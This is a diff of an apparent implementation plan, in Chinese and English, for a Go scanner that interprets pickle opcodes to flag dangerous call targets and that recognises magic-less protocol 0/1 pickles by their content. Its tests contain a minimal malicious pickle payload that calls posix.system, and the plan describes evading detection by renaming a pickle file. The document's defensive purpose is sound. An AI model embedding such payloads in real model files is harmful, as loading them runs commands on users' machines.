+func (p *pickleScanner) exec(op byte) {
+	switch op {
+	case 0x28: // MARK
+		p.push(pickSlot{mark: true})
+	case 0x30, 0x61, 0x62: // POP APPEND BUILD
+		p.pop(1)
+	case 0x73: // SETITEM
+		p.pop(2)
+	case 0x31, 0x65, 0x75, 0x90: // POP_MARK APPENDS SETITEMS ADDITEMS
+		p.popToMark()
+	case 0x64, 0x6c, 0x74, 0x6f, 0x91: // DICT LIST TUPLE OBJ FROZENSET
+		p.popToMark()
+		p.push(pickSlot{})
+	case 0x69: // INST: module and name inline, then the args popped to the mark.
+		// The protocol-0/1 spelling of "resolve this attribute", so it names a
+		// target the same way GLOBAL does.
+		p.recordTarget(p.opOff)
+		p.popToMark()
+		p.push(pickSlot{})
+	case 0x32: // DUP
+		if s, ok := p.top(); ok {
+			p.push(s)
+		}
+	case 0x2e: // STOP
+		p.stopped, p.hitStop = true, true
+	case 0x80, 0x95: // PROTO, FRAME: operand read, nothing to apply
+	case 0x4e, 0x88, 0x89, 0x7d, 0x5d, 0x29, 0x8f, 0x97:
+		// NONE NEWTRUE NEWFALSE EMPTY_DICT EMPTY_LIST EMPTY_TUPLE EMPTY_SET
+		// NEXT_BUFFER
+		p.push(pickSlot{})
+	case 0x98: // READONLY_BUFFER: rewrites the top, net stack effect zero
+	case 0x46, 0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x47, 0x8a, 0x8b, 0x50:
+		// FLOAT INT BININT BININT1 LONG BININT2 BINFLOAT LONG1 LONG4 PERSID
+		p.push(pickSlot{})
+	case 0x51: // BINPERSID: pops the persistent id the loader will resolve
+		p.pop(1)
+		p.push(pickSlot{})
+	case 0x52, 0x81: // REDUCE, NEWOBJ
+		p.pop(2)
+		p.push(pickSlot{})
+	case 0x92: // NEWOBJ_EX
+		p.pop(3)
+		p.push(pickSlot{})
+	case 0x82, 0x83, 0x84: // EXT1 EXT2 EXT4
+		// The callable comes from a process-global extension registry the stream
+		// does not name, so there is no target to record.
+		p.push(pickSlot{})
+	case 0x85: // TUPLE1
+		p.pop(1)
+		p.push(pickSlot{})
+	case 0x86: // TUPLE2
+		p.pop(2)
+		p.push(pickSlot{})
+	case 0x87: // TUPLE3
+		p.pop(3)
+		p.push(pickSlot{})
+	case 0x53, 0x56: // STRING, UNICODE: text operands
+		p.push(pickSlot{str: p.keep, unresolved: !p.keep, value: string(bytes.TrimRight(p.arg, "\n"))})
+	case 0x54, 0x55, 0x58, 0x8c, 0x8d, 0x42, 0x43, 0x8e, 0x96:
+		// BINSTRING SHORT_BINSTRING BINUNICODE SHORT_BINUNICODE BINUNICODE8
+		// BINBYTES SHORT_BINBYTES BINBYTES8 BYTEARRAY8. Byte operands are kept
+		// string-like too: a module name spelled as bytes is not a valid
+		// STACK_GLOBAL in CPython, so it cannot appear in a stream that runs, but
+		// refusing to look at it would trade a false positive that cannot happen
+		// for a blind spot that can.
+		p.push(pickSlot{str: p.keep, unresolved: !p.keep, value: string(p.arg)})
+	case 0x63: // GLOBAL: module and name inline
+		if !p.keep {
+			p.set.markStructural(fmt.Sprintf(
+				"GLOBAL at offset %d has an operand past the %d-byte cap", p.opOff, pickleMaxOperandBytes))
+		}
+		p.recordTarget(p.opOff)
+		p.push(pickSlot{})
+	case 0x68, 0x6a, 0x67: // BINGET LONG_BINGET GET
+		var idx int
+		if op == 0x67 {
+			idx = atoiSafe(string(bytes.TrimRight(p.arg, "\n")))
+		} else {
+			idx = int(leUint(p.arg))
+		}
+		if s, ok := p.memo[idx]; ok {
+			p.push(s)
+			return
+		}
+		// A memo index the stream never wrote cannot be resolved. Whether that
+		// matters is decided where the value is used, not here: pushing unresolved
+		// and bounding only if STACK_GLOBAL consumes it keeps a bound off streams
+		// where the reference is harmless.
+		p.push(pickSlot{unresolved: true})
+	case 0x71, 0x72, 0x70, 0x94: // BINPUT LONG_BINPUT PUT MEMOIZE
+		var idx int
+		switch op {
+		case 0x70:
+			idx = atoiSafe(string(bytes.TrimRight(p.arg, "\n")))
+		case 0x94:
+			// MEMOIZE stores at len(memo), matching CPython's dict-length rule so
+			// that a stream mixing explicit PUT with MEMOIZE indexes the same
+			// slots the unpickler would.
+			idx = len(p.memo)
+		default:
+			idx = int(leUint(p.arg))
+		}
+		if len(p.memo) >= pickleMaxMemoSlots {
+			p.overflow(fmt.Sprintf("pickle memo exceeded %d entries at offset %d", pickleMaxMemoSlots, p.opOff))
+			return
+		}
+		if s, ok := p.top(); ok {
+			p.memo[idx] = s
+		} else {
+			p.memo[idx] = pickSlot{}
+		}
+	case 0x93: // STACK_GLOBAL: the top two strings are the module and the name
+		if len(p.stack) < 2 {
+			p.push(pickSlot{})
+			return
+		}
+		name := p.stack[len(p.stack)-1]
+		mod := p.stack[len(p.stack)-2]
+		p.pop(2)
+		if mod.unresolved || name.unresolved {
+			// The stream asked to resolve a target we could not name. Silence here
+			// is the one thing not allowed: it would be a target we did not read
+			// while reporting the file as read.
+			p.set.markStructural(fmt.Sprintf(
+				"STACK_GLOBAL at offset %d reads an operand the interpreter could not resolve", p.opOff))
+			p.push(pickSlot{})
+			return
+		}
+		if mod.str && name.str {
+			p.emit(mod.value, name.value, p.opOff)
+		}
+		p.push(pickSlot{})
+	}
+}
+
+// recordTarget emits the module.name pair a GLOBAL or INST operand carries. The
+// operand bytes are "module\nname\n", both segments newline-terminated, which is
+// why they are read as a pair and not as two independent strings.
+func (p *pickleScanner) recordTarget(off int64) {
+	if !p.keep {
+		return
+	}
+	i := bytes.IndexByte(p.arg, '\n')
+	if i < 0 {
+		return
+	}
+	rest := p.arg[i+1:]
+	j := bytes.IndexByte(rest, '\n')
+	if j < 0 {
+		return
+	}
+	mod, name := string(p.arg[:i]), string(rest[:j])
+	if mod == "" || name == "" {
+		return
+	}
+	p.emit(mod, name, off)
+}
+
+// emit records one target. It goes through add so that the cap and the
+// (source, text) deduplication are the set's, not this scanner's: a checkpoint
+// that rebuilds ten thousand tensors names the same rebuilder ten thousand times,
+// and the listing needs it once.
+func (p *pickleScanner) emit(mod, name string, off int64) {
+	p.set.add(SourcePickle, off, mod+"."+name)
+}
+
+// atoiSafe parses the decimal text operand GET and PUT carry. It stops at the
+// first non-digit rather than failing: the operand is already the right shape (a
+// line the caller could not mis-parse), and a malformed index can only address a
+// memo slot that does not exist, which is the dangling-reference case handled
+// above.
+func atoiSafe(s string) int {
+	n := 0
+	for _, c := range s {
+		if c < '0' || c > '9' {
+			return n
+		}
+		n = n*10 + int(c-'0')
+	}
+	return n
+}
+```
+
+- [ ] **Step 4: 把 pickle 解释器接进采集路径（带门控）**
+
+先定下门控规则，后面 Task 6、Task 7 按它各自接线时都引用这条：
+
+**解释器只在"被声明为 pickle 的流"上运行**：(a) `set.Kind == KindPickle` 的整文件路径（`streamEvidence` 与 `streamHeadAndTail`）；(b) 分类为 `KindPickle` 的容器成员（`streamReaderEvidence` 传 `pickleScan=true`）；(c) 解压后头部嗅探为 pickle 的 gzip 流（`isPickleStream`）。**`KindELF` 以及其它任何类型绝不进解释器**：解释器一旦运行就提交于一次解析，非 pickle 的首字节不是 opcode，会立刻置 `Bound.Structural`，而对可执行类型（`isExecutableKind`：`KindELF`/`KindPickle`/`KindArchive`/`KindCompressed`）`Bound.Structural` 会**阻断导入**——一个 `.so`、一个 `.whl`、一个 `.pt` 都会因此被判为未完整扫描而拒绝导入。这一条是承重的，后来者不能把它"简化"成无条件运行。
+
+本步骤只改 Task 2 写的 `streamEvidence`；Task 6 的 `streamReaderEvidence` 与 Task 7 的 `streamHeadAndTail` 在各自的任务里做同一门控（它们还没被定义，不能在这里改）。
+
+修改 `streamEvidence` 的读循环，使一次遍历在门控成立时同时产出 strings 与 pickle 两类证据：
 
 ```go
 	scanner := newStringScanner(set, cfg)
-	pickles := newPickleScanner(set)
-	...
-		if n > 0 {
-			chunk := buf[:n]
+	// The interpreter runs only where the file is claimed to be a pickle. A
+	// byte-pattern scan was harmless on any input because it never committed to a
+	// parse; this one commits, and an ELF's first byte is not an opcode, so
+	// running it over a shared object would set Bound.Structural - and for a
+	// shared object that bound blocks the import.
+	var pickles *pickleScanner
+	if set.Kind == KindPickle {
+		pickles = newPickleScanner(set)
+	}
+```
+
+然后在 `chunk := buf[:n]` 之后：
+
+```go
 			if _, wErr := scanner.Write(chunk); wErr != nil {
 				return fmt.Errorf("scan %s: %w", path, wErr)
 			}
-			if _, wErr := pickles.Write(chunk); wErr != nil {
-				return fmt.Errorf("scan %s: %w", path, wErr)
+			if pickles != nil {
+				if _, wErr := pickles.Write(chunk); wErr != nil {
+					return fmt.Errorf("scan %s: %w", path, wErr)
+				}
 			}
 			read += int64(n)
-		}
 ```
 
-并在 `scanner.Flush()` 后加 `pickles.Flush()`。
+并在末尾 `scanner.Flush()` 之后加：
+
+```go
+	if pickles != nil {
+		pickles.Flush()
+	}
+```
 
 - [ ] **Step 5: 跑测试确认通过**
 
@@ -1461,8 +2659,391 @@ go test ./internal/codeaudit/ -run 'TestPickle|TestString|TestStream|TestShannon
 ```bash
 gofmt -l internal/codeaudit/ ; go vet ./internal/codeaudit/
 git add internal/codeaudit/binary_evidence.go internal/codeaudit/binary_evidence_test.go
-git commit -m "feat(audit): extract pickle call targets from binary streams"
+git commit -m "feat(audit): resolve pickle call targets with an opcode interpreter"
 ```
+
+---
+
+### Task 4b: 无 magic 的协议 0/1 pickle 按内容认领
+
+> **为什么编号是 4b：** 它修的是 Task 4 立下的**认领规则**，不是新加一个子系统——`isPickleStream` 只靠扩展名认领协议 0/1，而改名是免费的。插入而不重排任务号，是为了不让 Task 5–15 的既有交叉引用全部漂移。
+
+**Files:**
+- Modify: `internal/codeaudit/binary_detect.go`
+- Test: `internal/codeaudit/binary_detect_test.go`
+- Test: `internal/codeaudit/binary_scanner_test.go`
+- Test: `internal/codeaudit/binary_evidence_test.go`
+
+**背景（已在源码上核实，不是推测）：** 协议 0/1 的 pickle 没有 magic。`isPickleStream` 只在尾部用扩展名（`.pkl`/`.pickle`/`.joblib`）认领它们，于是：
+
+- 一个协议 0 pickle 改名 `model.bin` / `model.pt` / `payload.pth`（三者都在 `binaryExtensions` 里）→ `KindRaw`，pickle 解释器**不跑**；
+- 改名 `model.json`（不在 `binaryExtensions`、内容又是 ASCII）→ `KindText`，**连分类都不算二进制的**；
+- 改名后无扩展名 → `KindText`。
+
+三种情况 `PKL_001`(HIGH) **连无上限时都不触发**，而阻断家族没有一条读 `SourceStrings`，所以只剩 LOW 字符串 family → `passed=true`，恶意包被导入。改一个文件名即可，这是这个通道最核心那条 HIGH 规则的整条绕过。
+
+**但按内容认领的第一版规则经反例证伪，这里记下来：** 规则原文是"一个头能被**解释器自己**走到 `SourcePickle` 目标、且途中不置任何 `Bound.Structural` 的流，就是 pickle 流，无论它叫什么名字"。它错在 `i` 是协议 0 的 `INST` opcode，把**后两行**当作 module 和 name，于是再普通不过的 import 行也是操作数形状的：
+
+```go
+ClassifyBinary([]byte("import os\nos.system('x')\n"), "train.py") == KindPickle   // WRONG
+ClassifyBinary([]byte("import os\nimport sys\n"),  "train.py") == KindPickle      // 19 bytes, walks cleanly
+```
+
+后果不是表面文章：一个 `Claimed` 路径会被从源码臂的读取里摘掉（Task 11 的 `MergeBinaryFindings` 丢弃 `Claimed` 里每个路径的文本 finding），于是一个伪装成 pickle 的 `.py` 能藏住一条**源码** HIGH——这是规则**新引入**的绕过，不是文件本身的。更值得记住的是它**没被语料测量抓住**：2782 个真实 `.py`/`.pyc`/`.so` 里新认领 0 个，唯一抓住它的是既有的 `python_source_stays_text` 用例。教训：**"N 个真实文件里 0 个改变"不是一条规则对对抗性输入安全的证据**——真实文件在前 4 KiB 内就失步，反例只是一个 19 字节的文件。
+
+**修正后的认领规则：** 一个协议 0/1 流按内容认领需要**三个信号同时成立**：（1）扩展名不是源码臂读取的那种（`sourceExtensions`）；（2）头能被**解释器自己**走到 `SourcePickle` 目标、途中不置任何 `Bound.Structural`；（3）该目标是点分标识符（`pickleTargetRe`）。复用解释器而不是手写第二张 opcode 表——手写的校验器是 `operandOf` 的第二份拷贝，第一次新增 opcode 就会分叉，而分叉的代价是"认领了却解析失败"。
+
+- [ ] **Step 1: 写失败测试**
+
+追加到 `internal/codeaudit/binary_detect_test.go`（**新加函数，不要改既有的 `TestClassifyBinary` 表**，避免猜测它的字段形状；但既有的那张表——包括它的 `python_source_stays_text` 用例——必须**原样通过**，它就是信号 1（源码名一律不按内容认领）的验收判据）：
+
+```go
+// TestClassifyBinaryClaimsAProtocol01PickleByItsContent pins the claim rule for
+// the one pickle shape that has no magic. A protocol 0/1 stream is ASCII, so
+// neither the magic test nor looksBinary sees it, and the extension was the only
+// signal left - which made a rename the whole evasion.
+func TestClassifyBinaryClaimsAProtocol01PickleByItsContent(t *testing.T) {
+	// The classic protocol 0 payload: GLOBAL posix.system, then REDUCE over a
+	// one-element tuple. The interpreter resolves the GLOBAL to a SourcePickle
+	// line, and that line is what the claim rests on.
+	payload := []byte("cposix\nsystem\n(Vid\ntR.")
+	// A real protocol 0 pickle of a two-element list. It is a pickle, and it
+	// carries no module.attribute target, so there is no PKL_001 evidence to
+	// find in it.
+	noTarget := []byte("(lp0\nI1\naI2\na.")
+
+	cases := []struct {
+		name string
+		head []byte
+		path string
+		want BinaryKind
+	}{
+		{"a payload named .bin is claimed", payload, "model.bin", KindPickle},
+		{"a payload named .pt is claimed", payload, "model.pt", KindPickle},
+		{"a payload named .pth is claimed", payload, "payload.pth", KindPickle},
+		{"a payload named .json is claimed", payload, "model.json", KindPickle},
+		{"a payload with no extension is claimed", payload, "payload", KindPickle},
+		{"the extension's case does not decide it", payload, "MODEL.PT", KindPickle},
+
+		// An import line is operand-shaped: "i" is INST and takes the next two
+		// lines as its module and name, so this head walks and resolves a target.
+		// It is still a source file, and the sniff must not take it.
+		{"an import-led source head stays text",
+			[]byte("import os\nos.system('x')\n"), "train.py", KindText},
+		// The same head under a name the source arm does not read is not claimed
+		// either: the "target" it resolves is a line of text read as an operand,
+		// not a module.attribute pair.
+		{"an import-led head named .bin is not claimed",
+			[]byte("import os\nos.system('x')\n"), "model.bin", KindRaw},
+		// A real target is a dotted identifier, and the shape test must not
+		// overreach: this is the two-line protocol 0 pickle of an OrderedDict.
+		{"a dotted-identifier target is claimed",
+			[]byte("ccollections\nOrderedDict\np0\n."), "model.bin", KindPickle},
+		// The sniff refuses a source name; the extension set still claims one.
+		{"a source-named file with a pickle name is still claimed",
+			payload, "model.pkl", KindPickle},
+
+		{"a target-less pickle named .bin stays raw", noTarget, "model.bin", KindRaw},
+		{"a target-less pickle named .json stays text", noTarget, "model.json", KindText},
+		{"a target-less pickle named .pkl is still claimed by extension", noTarget, "model.pkl", KindPickle},
+
+		// A realistic source file: "#" is not an opcode, so the walk stops at
+		// byte 0 and the file stays with the channel that reads Python.
+		{"python source is not taken from the source channel",
+			[]byte("# -*- coding: utf-8 -*-\nimport os\nos.system('id')\n"), "train.py", KindText},
+		// The 3.10 .pyc magic begins 0x6f, which is the OBJ opcode: the walk takes
+		// "\r\r" as a module name and then runs out of head mid-operand, so no
+		// target is resolved. The coincidence is why the case is pinned.
+		{"a 3.10 pyc head is not claimed",
+			[]byte{0x6f, 0x0d, 0x0d, 0x0a, 0x00, 0x00, 0x00, 0x00, 0x00}, "m.cpython-310.pyc", KindRaw},
+		{"a 3.12 pyc head is not claimed",
+			[]byte{0xcb, 0x0d, 0x0d, 0x0a, 0x00, 0x00, 0x00, 0x00, 0x00}, "m.cpython-312.pyc", KindRaw},
+		{"a binary blob is not claimed",
+			[]byte{0x00, 0x01, 0x02, 0x63, 0x70, 0x6f, 0x73, 0x69, 0x78, 0x0a}, "weights.bin", KindRaw},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			if got := ClassifyBinary(tc.head, tc.path); got != tc.want {
+				t.Errorf("ClassifyBinary(%q, %q) = %q, want %q", tc.head, tc.path, got, tc.want)
+			}
+		})
+	}
+}
+```
+
+- [ ] **Step 1b: 钉住认领规则唯一的耦合（源码臂的默认扩展名）**
+
+追加到 `internal/codeaudit/binary_detect_test.go`：
+
+```go
+// TestSourceExtensionsCoverTheSourceArmsDefaults pins the one coupling the claim
+// rule rests on: every extension the source arm reads has to be one the sniff
+// refuses. The rule is not "these are source files", it is "another channel has
+// rules for this file, so this one does not take it" - and a language added to
+// the source arm without being added here would silently reopen the hole the
+// guard closes, because MergeBinaryFindings drops the text findings of every
+// claimed file.
+func TestSourceExtensionsCoverTheSourceArmsDefaults(t *testing.T) {
+	exts := DefaultConfig().Extensions
+	if len(exts) == 0 {
+		t.Fatal("the source arm's default extension list is empty, so this test asserts nothing")
+	}
+	for _, ext := range exts {
+		if !sourceExtensions[strings.ToLower(ext)] {
+			t.Errorf("the source arm reads %s and the pickle sniff would claim it: add it to sourceExtensions", ext)
+		}
+	}
+}
+```
+
+（`DefaultConfig()` 在 `internal/codeaudit/scanner.go:20`，返回 `Extensions: []string{".py"}`；所以这道护栏是包级常量而不是配置项——没有任何运行时配置项写 `Extensions`，`grep` 显示它只在那里被写入。）
+
+- [ ] **Step 2: 跑测试确认失败**
+
+```bash
+go test ./internal/codeaudit/ -run 'TestClassifyBinaryClaimsAProtocol01PickleByItsContent' -count=1 2>&1 | head -20
+```
+
+预期：七条 FAIL——前六条与新增的 `"a dotted-identifier target is claimed"`（`want "pickle"`，得到 `"raw"` 或 `"text"`）。其余各条此时应当已经通过——它们钉的是"不许扩张"，失败说明规则写歪了。
+
+- [ ] **Step 3: 实现**
+
+修改 `internal/codeaudit/binary_detect.go`。`isPickleStream` 增加按内容认领的手臂，并新增 `sourceExtensions` / `pickleTargetRe` 两个声明与探测函数（`regexp` 因此成为该文件的新 import）：
+
+```go
+// sourceExtensions are the extensions the source arm reads, and the pickle sniff
+// never claims one of them.
+//
+// It is not a second opinion about what source is. What makes a file a source
+// file here is that another channel has rules for it: a claimed file is dropped
+// from that channel's reading (MergeBinaryFindings keeps no text finding for a
+// path in Claimed), so claiming a source file would leave it read by neither -
+// this channel would discard its text findings and the source arm would not be
+// believed about it. An import line is exactly the shape of a protocol 0 target -
+// "i" is INST, which consumes the next two lines as its module and name, so
+// "import os\nos.system('x')\n" walks cleanly and resolves one - which is why the
+// extension, and not the walk, is what separates the two readings.
+//
+// TestSourceExtensionsCoverTheSourceArmsDefaults pins the correspondence, so a
+// language added to the source arm has to be added here in the same change.
+var sourceExtensions = map[string]bool{
+	".py": true,
+}
+
+// isPickleStream reports whether head begins a pickle stream.
+//
+// Pickle protocols 2 and up begin with PROTO (0x80) followed by the protocol
+// number, which is a magic. Protocols 0 and 1 have no magic at all: a protocol 0
+// pickle of a tuple is the single byte "(", and a payload is ASCII to the last
+// byte. For those the extension used to be the only signal, and that left a
+// rename as the whole evasion - "cposix\nsystem\n(Vid\ntR." named model.bin,
+// model.pt or payload.pth was classified raw, and named model.json it was
+// classified text, and either way the interpreter never ran and PKL_001 could
+// not fire.
+//
+// So a protocol 0/1 stream is claimed by its content. Three signals decide it,
+// and each one closes a hole the others leave open:
+//
+//   - The extension is not one the source arm reads. See sourceExtensions: a
+//     claimed file is dropped from the source arm's reading, so a crafted source
+//     file shaped like a pickle could hide a source finding.
+//   - The head walks to a target with no structural mark on the way.
+//   - The target is shaped like one. See sniffProtocol01Pickle: without this, an
+//     import line resolves "mport os.os.system('x')", which is a line of text
+//     read as an operand rather than a target.
+//
+// The extension set stays as the last signal, where it still catches a protocol
+// 0/1 stream whose target lies past the head and a source-named file that the
+// sniff refuses: a .pkl is a pickle whatever its bytes look like.
+func isPickleStream(head []byte, path string) bool {
+	if len(head) >= 2 && head[0] == 0x80 && head[1] >= 0x02 && head[1] <= 0x05 {
+		return true
+	}
+	ext := strings.ToLower(filepath.Ext(path))
+	switch ext {
+	case ".pkl", ".pickle", ".joblib":
+		return true
+	}
+	if sourceExtensions[ext] {
+		return false
+	}
+	return sniffProtocol01Pickle(head)
+}
+
+// sniffProtocol01Pickle reports whether head begins a pickle stream that the
+// unpickler would resolve a module.attribute target in.
+//
+// It asks the interpreter rather than a second opcode table. The claim has to
+// agree with the parse that follows it, and a hand-written validator would be a
+// second copy of operandOf, drifting the first time an opcode is added - and a
+// claim that then fails to parse is not a wasted pass, it is a file counted
+// BoundedExecutable.
+//
+// Three conditions, all required:
+//
+//   - No structural mark. A mark means the walk desynchronised - an unknown
+//     opcode, an operand past pickleMaxOperandBytes, an overrun stack or memo -
+//     and a stream that cannot survive its own head is not one to claim.
+//   - At least one SourcePickle line, because a stream with no module.attribute
+//     target carries no PKL_001 evidence and the claim is not free: a claimed
+//     file is read by the pickle interpreter instead of the string scanner.
+//   - That line is shaped like a target. GLOBAL, INST and OBJ take their operands
+//     as newline-terminated lines, so any two lines of text read as one - "import
+//     os" resolves "mport os.os.system('x')". A module.attribute pair cannot
+//     contain a space or a bracket, and requiring that is what tells a stream
+//     from a text file that happens to line up.
+//
+// Flush is deliberately not called. A head is a prefix, so "no STOP yet" is the
+// expected state at this offset, and Flush reads exactly that as a stream that
+// ended without STOP.
+//
+// The claim is made about a prefix. A file that walks cleanly to the end of the
+// head and desynchronises past it is still claimed, and the scanner then counts
+// it BoundedExecutable and withholds the pass - the fail-closed direction, with
+// the bound visible in the report rather than silent.
+func sniffProtocol01Pickle(head []byte) bool {
+	if len(head) == 0 {
+		return false
+	}
+	probe := newEvidenceSet("", KindPickle, BinaryConfig{})
+	p := newPickleScanner(probe)
+	_, _ = p.Write(head)
+	if probe.Bound.Structural {
+		return false
+	}
+	for _, line := range probe.Lines {
+		if line.Source == SourcePickle && pickleTargetRe.MatchString(line.Text) {
+			return true
+		}
+	}
+	return false
+}
+
+// pickleTargetRe is the shape of a resolved module.attribute target: a dotted
+// identifier, at least one dot, because recordTarget writes "module.name". A line
+// that is not this shape came from a walk that consumed text as an operand.
+var pickleTargetRe = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]*(?:\.[A-Za-z_][A-Za-z0-9_]*)+$`)
+```
+
+（`binary_detect.go` 的 import 需要**新增 `regexp`**——`pickleTargetRe` 用它编译形状正则；`bytes`、`path/filepath`、`strings` 已在，`newEvidenceSet`/`newPickleScanner`/`BinaryConfig`/`SourcePickle` 同包。）
+
+- [ ] **Step 4: 端到端测试——通道真的报出 PKL_001**
+
+追加到 `internal/codeaudit/binary_scanner_test.go`（夹具请沿用该文件既有的写法；下面的 `writeFixture` 只是占位，换成文件里已有的辅助函数）：
+
+```go
+// TestBinaryScannerClaimsAProtocol01PickleNamedAsWeights runs the claim rule
+// through the channel. The file's name is the one the extension set reads as a
+// raw blob, so the finding exists only if the interpreter ran.
+func TestBinaryScannerClaimsAProtocol01PickleNamedAsWeights(t *testing.T) {
+	dir := t.TempDir()
+	writeFixture(t, filepath.Join(dir, "model.bin"), "cposix\nsystem\n(Vid\ntR.")
+
+	res, err := NewBinaryScanner(nil, BinaryConfig{}).ScanDirectory(dir)
+	if err != nil {
+		t.Fatalf("ScanDirectory: %v", err)
+	}
+	if res.Summary.Kinds[string(KindPickle)] != 1 {
+		t.Errorf("kinds = %v, want one pickle", res.Summary.Kinds)
+	}
+	// The claim must not, by itself, make the pass unprovable: the stream is a
+	// pickle and it parses, so nothing here is a look that did not happen.
+	if res.Summary.BoundedExecutable != 0 || res.Summary.BoundedData != 0 || res.Summary.Incomplete != 0 {
+		t.Errorf("summary = %+v, want no bounds on a clean parse", res.Summary)
+	}
+	var found bool
+	for _, f := range res.Findings {
+		if f.RuleID == "PKL_001" {
+			found = true
+			if f.Severity != SeverityHigh {
+				t.Errorf("PKL_001 severity = %q, want %q", f.Severity, SeverityHigh)
+			}
+			if f.BinaryKind != string(KindPickle) || f.EvidenceSource != string(SourcePickle) {
+				t.Errorf("finding provenance = (%q, %q), want (%q, %q)",
+					f.BinaryKind, f.EvidenceSource, KindPickle, SourcePickle)
+			}
+		}
+	}
+	if !found {
+		t.Errorf("no PKL_001 finding; findings = %+v", res.Findings)
+	}
+}
+```
+
+再追加一条钉住**残余**的测试（延迟失步只在头之后才暴露）。构造一个 ≥4096 字节、全程合法的前缀，再让头之后的字节失步：
+
+```go
+// TestBinaryScannerCountsAStreamThatDesynchronisesPastTheHead pins the accepted
+// residual of claiming a protocol 0/1 stream by its head: a file that walks
+// cleanly across the whole head and then hits an unknown opcode is still
+// claimed, and the scanner counts it BoundedExecutable. Withholding is the
+// fail-closed answer here, and the bound is in the report rather than silent.
+func TestBinaryScannerCountsAStreamThatDesynchronisesPastTheHead(t *testing.T) {
+	// A clean prefix: a GLOBAL target, then a MARK and thousands of pushed ints,
+	// so the first 4096 bytes are all legal opcodes.
+	var b strings.Builder
+	b.WriteString("cposix\nsystem\n")
+	b.WriteString("(")
+	for b.Len() < sniffBytes {
+		b.WriteString("I1\n")
+	}
+	b.WriteString("t")     // TUPLE: closes the MARK
+	b.WriteString("\x00junk") // the first byte the interpreter cannot read
+	dir := t.TempDir()
+	writeFixture(t, filepath.Join(dir, "model.bin"), b.String())
+
+	res, err := NewBinaryScanner(nil, BinaryConfig{}).ScanDirectory(dir)
+	if err != nil {
+		t.Fatalf("ScanDirectory: %v", err)
+	}
+	if res.Summary.BoundedExecutable != 1 {
+		t.Errorf("bounded_executable = %d, want 1: summary = %+v", res.Summary.BoundedExecutable, res.Summary)
+	}
+}
+```
+
+（`strings` 可能要在该测试文件里 import；若已有则不加。）
+
+- [ ] **Step 5: 归档成员一并生效**
+
+`ClassifyBinary` 还有第二个调用点：`binary_evidence.go:1770`，对 zip 的每个成员分类，`KindPickle` 成员随后走 `collectPickleMember`。所以上面这条规则对归档内成员同样生效。追加一条测试到 `internal/codeaudit/binary_evidence_test.go`（沿用该文件既有的 zip 夹具写法）：一个 zip，成员名 `data.bin`，内容是协议 0 载荷；断言收集到的证据里存在 `SourcePickle` 行。
+
+- [ ] **Step 6: 用真实语料证伪（这一步是这次修复的关键证据，不要跳过）**
+
+在包内临时写一个测试文件（跑完**删除**，不要提交），对仓库里的真实文件调用 `ClassifyBinary`，逐类计数，重点回答四个问题：
+
+```bash
+ls models/examples/__pycache__ models/audit/tools/cpg/__pycache__ 2>/dev/null
+find models -name '*.pyc' | head
+find models -name '*.bin' -o -name '*.pt' -o -name '*.pth' 2>/dev/null | head
+```
+
+要求报告：
+1. 真实 `.pyc` / `.py` / `.so` 里**被新规则认领的有几个**——预期 0。若不是 0，把文件名和头几个字节带回来，规则太松。
+2. 用 `python3 -I -c 'import pickle,os;print(repr(pickle.dumps(os.system,0)))'` 之外的方式构造一个真实的协议 0 pickle（例如 `python3 -I -c 'import pickle,collections;print(repr(pickle.dumps(collections.OrderedDict,0)))'`），确认它**被认领**（`ccollections\nOrderedDict\np0\n.`）。
+3. 每个文件分类的额外耗时：把 `ClassifyBinary` 在一个真实目录上跑若干遍，给出每文件的平均微秒数，与"只做 magic + looksBinary 的旧路径"对比。数量级即可，不必精确。
+4. 有多少真实文件的头能一路走通、但被点分标识符形状拒掉（也就是旧规则会误认领的）？这个数就是信号 3 买回来的东西。
+
+**本轮实测结果（`/home/hjy/taa/models`，14 366 个文件）：**
+- `.py`/`.pyc`/`.so` 共扫 2782 个，**新认领 0 个**；其中 1715 个是 ≤4096 字节的 `.py`，643 个的首字节就是一个 pickle opcode——语料确实走到了这条路径上，只是没有一个被误认领。
+- `pickle.dumps(collections.OrderedDict, 0)` = `b'ccollections\nOrderedDict\np0\n.'` → **被认领**。
+- 耗时：完整分类 3.24 µs/文件，对照"只做 magic + looksBinary + 扩展名"的路径 1.38 µs/文件（3413 个文件 × 20 轮），即 **+1.9 µs/文件**。
+
+- [ ] **Step 7: 跑全包测试与提交**
+
+```bash
+gofmt -l internal/codeaudit/ ; go vet ./internal/codeaudit/
+go test ./internal/codeaudit/ -count=1
+go build ./...
+git add internal/codeaudit/binary_detect.go internal/codeaudit/binary_detect_test.go internal/codeaudit/binary_scanner_test.go internal/codeaudit/binary_evidence_test.go
+git commit -m "fix(audit): claim a protocol 0/1 pickle by its content, not its name"
+```
+
+预期：`gofmt -l internal/codeaudit/` 只列出既有的三个未格式化文件（`audit.go`、`llm.go`、`result_checker.go`），**严禁 `gofmt -w`**——它们在本任务之前就没格式化，动它们会把无关改动混进本次提交。
+
+> **取舍（必须写进代码注释，也必须让复审能挑战）：** 认领是对**前缀**做的，所以"头之后才失步"的文件仍会被认领、计 `BoundedExecutable`、导致扣包。这要求 ≥4KiB 的**真 pickle 前缀**后面接不上 STOP，本身就属于可疑文件，扣包是 fail-closed 的正确方向。上一轮讨论里提过"解析失败只记不扣包的 bound"，这里**没有**采纳：探测已经把"误认领"压到几乎不可能，为残余再引一条"试探性认领"的 provenance 管道，会去动 Task 9 已钉住的 `isExecutableKind` 不变式，代价大于收益。这个偏离要在提交说明和给用户的回报里讲清楚。
+
+> **另一条边界（不在本任务范围，须写进 Task 15 的 README）：** 认领靠内容，所以协议 0/1 的 pickle 无论叫什么都会被读；但**扩展名**手臂仍在，用于"目标在头之后"的协议 0/1 流（例如先来 50KiB BINSTRING 再来 GLOBAL 的协议 1 流，只有 `.pkl`/`.pickle`/`.joblib` 会被认领）。这是一条真实的残余边界，README 里要写明，不要假装覆盖完整。
 
 ---
 
@@ -1473,6 +3054,19 @@ git commit -m "feat(audit): extract pickle call targets from binary streams"
 - Modify: `internal/codeaudit/binary_evidence.go`
 - Test: `internal/codeaudit/binary_evidence_test.go`
 
+本 Task 的 `collectELF` 要用 `errors.Is(err, elf.ErrNoSymbols)` 区分"没有符号表"和"读符号表失败"。`errors` 在 Task 2 建立这个文件时还没有使用者（Go 拒绝未使用的 import，那时加上会直接编译失败），所以先把 import 块补成：
+
+```go
+import (
+	"errors"
+	"fmt"
+	"io"
+	"os"
+	"sort"
